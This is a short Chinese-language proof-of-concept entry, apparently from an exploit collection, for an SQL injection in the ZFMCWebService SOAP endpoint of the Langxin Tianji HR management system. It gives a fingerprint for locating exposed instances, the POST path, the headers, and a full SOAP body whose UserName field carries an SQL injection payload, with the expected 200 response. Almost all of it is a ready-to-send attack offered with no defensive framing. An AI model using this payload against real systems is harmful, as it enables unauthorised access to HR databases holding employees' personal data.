# 朗新天霁人力资源管理系统ZFMCWebService存在SQL注入漏洞

- **系统**：朗新天霁人力资源管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`product="HRSOFT-人力资源管理系统"`
- **请求**：`POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/UserInfo"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8" ?>
<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
>
<soap:Body>
<UserInfo xmlns="http://tempuri.org/">
<UserName>') AND 1004 IN (SELECT (SELECT CASE WHEN 1004=1004 THEN 'sxsdvddqwe' ELSE 'sxsdvddqwe' END))-- OOxB</UserName>
<DeptName>rt</DeptName>
</UserInfo>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—